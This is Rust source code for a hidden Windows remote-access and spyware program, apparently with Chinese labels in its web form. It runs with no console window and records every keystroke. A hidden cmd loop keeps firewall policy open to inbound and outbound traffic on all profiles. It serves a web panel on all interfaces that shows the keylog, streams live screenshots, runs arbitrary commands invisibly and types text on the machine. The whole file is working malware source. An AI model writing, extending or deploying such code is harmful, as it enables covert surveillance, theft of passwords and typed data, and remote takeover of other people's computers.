#![windows_subsystem = "windows"]

use axum::{
    Form, Router,
    extract::ws::{Message, WebSocketUpgrade},
    response::Html,
    routing::{get, post},
};
use device_query::{DeviceEvents, DeviceEventsHandler};
use enigo::{Enigo, Keyboard, Settings};
use rdev::listen;
use serde::Deserialize;
use std::{
    env::args,
    io::Cursor,
    sync::{Arc, Mutex},
    time::Duration,
};
use tokio::{main, net::TcpListener, process::Command, spawn};
use xcap::{Monitor, image::ImageFormat};

#[derive(Deserialize)]
struct Frm {
    choice: String,
    text: String,
}

#[main]
async fn main() {
    let mut arg = args();
    arg.next();

    let lock = Arc::new(Mutex::new(String::new()));
    let lock1 = lock.clone();
    let lock2 = lock.clone();
    let lock3 = lock.clone();

    let lck = Arc::new(Mutex::new(String::new()));
    let lck1 = lck.clone();
    let lck2 = lck.clone();

    let handler = DeviceEventsHandler::new(Duration::ZERO).unwrap();
    let enigo = Arc::new(Mutex::new(Enigo::new(&Settings::default()).unwrap()));

    let _down = handler.on_key_down(move |key| {
        *lock2.lock().unwrap() += &(key.to_string() + "&#x2193; ");
    });

    let _up = handler.on_key_up(move |key| {
        *lock3.lock().unwrap() += &(key.to_string() + "&#x2191; ");
    });

    Command::new("cmd")
        .creation_flags(0x08000000)
        .arg("/c")
        .arg("for /l %i in (0,0,0) do @(netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound)")
        .spawn()
        .unwrap();

    spawn(async {
        let lckin = lck2;
        loop {
            let l = lckin.clone();
            listen(move |e| {
                if let Some(name) = e.name {
                    *l.lock().unwrap() += match &name[..] {
                        "&" => "&amp;",
                        "<" => "&lt;",
                        others => others,
                    };
                }
            })
            .unwrap();
        }
    });

    axum::serve(
        TcpListener::bind(String::from("0.0.0.0:") + &arg.next().unwrap_or(String::from("1145")))
            .await
            .unwrap(),
        Router::new()
            .route(
                "/",
                post(async move |Form(Frm { choice, text })| {
                    match &choice[..] {
                        "cmd" => {
                            Command::new("cmd")
                                .creation_flags(0x08000000)
                                .arg("/c")
                                .arg(&text)
                                .spawn()
                                .unwrap();
                        }
                        "code" => (), // TODO: code
                        "eni" => (),  // TODO: enigo
                        "rdev" => (), // TODO: rdev
                        "txt" => enigo.lock().unwrap().text(&text).unwrap(),
                        "clr" => {
                            lock.lock().unwrap().clear();
                            lck.lock().unwrap().clear();
                        }
                        _ => (),
                    }

                    Html("<script>window.location.href=''</script>")
                })
                .get(async move || {
                    Html(
                        String::from(
                            "<!DOCTYPE html><html><body><form action='/'method='post'><select name='choice'><option value='cmd'>命令</option><option value='code'>键盘码</option><option value='eni'>enigo按键</option><option value='rdev'>rdev按键</option><option value='txt'>输入</option><option value='clr'>清空</option></select><input name='text'/><input type='submit'/></form><pre style='white-space:pre-wrap;'>",
                        ) + lock1.lock().unwrap().as_str()
                            + "<hr>"
                            + lck1.lock().unwrap().as_str()
                            + "</pre><img src='screen.bmp'/><script>const ws=new WebSocket('screen.bmp');const img=document.querySelector('img');ws.onmessage=(e)=>{if(e.data instanceof Blob)img.src=URL.createObjectURL(event.data)}</script></body></html>",
                    )
                }),
            )
            .route(
                "/screen.bmp",
                get(async |ws: WebSocketUpgrade| {
                    ws.on_upgrade(async |mut sk| loop {
                        let mut buf = Cursor::new(Vec::new());
                        Monitor::all().unwrap()[0]
                            .capture_image()
                            .unwrap()
                            .write_to(&mut buf, ImageFormat::Bmp)
                            .unwrap();
                        sk.send(Message::from(buf.into_inner())).await.unwrap();
                    })
                }),
            ),
    )
    .await
    .unwrap();
}
